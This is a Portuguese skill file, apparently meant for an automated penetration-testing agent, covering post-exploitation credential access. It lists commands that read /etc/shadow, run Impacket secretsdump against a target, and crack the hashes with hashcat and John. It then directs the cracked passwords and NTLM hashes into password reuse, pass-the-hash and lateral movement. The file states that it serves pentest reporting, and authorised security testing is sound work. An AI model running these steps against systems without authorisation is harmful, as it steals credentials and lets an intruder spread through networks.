---
name: hash_dumping_and_cracking
phase: 5_post_exploitation
tools: [hashcat, john, mimikatz, secretsdump]
dependencies: [hashes_obtained]
mitre_tactic: TA0006 (Credential Access)
---

# Objetivo
Extrair e quebrar hashes de senha obtidos durante a exploração, seja de bancos de dados, arquivos de sistema (/etc/shadow, SAM/NTDS.dit) ou memória (via Mimikatz).

# Condições de Execução
- Hashes de senha foram obtidos (de banco de dados, dump de sistema ou memória).
- Acesso ao sistema com privilégios suficientes para extrair hashes (root/SYSTEM).

# Comandos e Sintaxe

## 1. Extrair Hashes Linux (/etc/shadow)
```bash
cat /etc/shadow | grep -v ':\*:\|:!:' | tee {workspace}/shadow_hashes.txt
unshadow /etc/passwd /etc/shadow > {workspace}/unshadowed.txt
```

## 2. Extrair Hashes Windows (Impacket secretsdump)
```bash
impacket-secretsdump {domain}/{username}:{password}@{target_ip} -outputfile {workspace}/secretsdump 2>&1 | tee {workspace}/secretsdump_output.txt
```

## 3. Identificar Tipo de Hash
```bash
hashid -m {hash_sample} 2>&1 | tee {workspace}/hash_type.txt
```

## 4. Quebrar com Hashcat (GPU)
```bash
hashcat -m {hash_mode} {workspace}/hashes.txt /usr/share/wordlists/rockyou.txt --force -o {workspace}/cracked.txt
```

## 5. Quebrar com John the Ripper (CPU)
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt {workspace}/unshadowed.txt
john --show {workspace}/unshadowed.txt | tee {workspace}/john_cracked.txt
```

# Hash Modes Comuns (Hashcat)
| Tipo | Mode (-m) | Exemplo |
|---|---|---|
| MD5 | 0 | 5d41402abc4b2a76b9719d911017c592 |
| SHA-256 | 1400 | e3b0c44298fc1c149afbf4c8996fb924... |
| NTLM | 1000 | aad3b435b51404eeaad3b435b51404ee |
| bcrypt | 3200 | $2a$10$... |
| sha512crypt | 1800 | $6$rounds=5000$... |

# Análise de Resultados
- **Senhas quebradas:** Teste-as em outros serviços (reutilização de senhas). Acione a skill `bruteforce_authentication` com as senhas quebradas.
- **Hashes NTLM obtidos:** Mesmo sem quebrar, podem ser usados em Pass-the-Hash. Acione a skill `lateral_movement_psexec`.
- **Senhas fracas encontradas:** Registre como vulnerabilidade de política de senhas no relatório.

# Próximos Passos
- Use credenciais quebradas para movimento lateral com a skill `lateral_movement_psexec`.
- Registre todas as senhas quebradas e a complexidade no relatório.

# Tratamento de Erros
- Se `hashcat` não estiver instalado: `sudo apt install hashcat -y`.
- Se não houver GPU disponível, use `john` (CPU) ou adicione `--force` ao hashcat.
- Se a wordlist não for suficiente, tente regras: `hashcat -m {mode} hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule`.
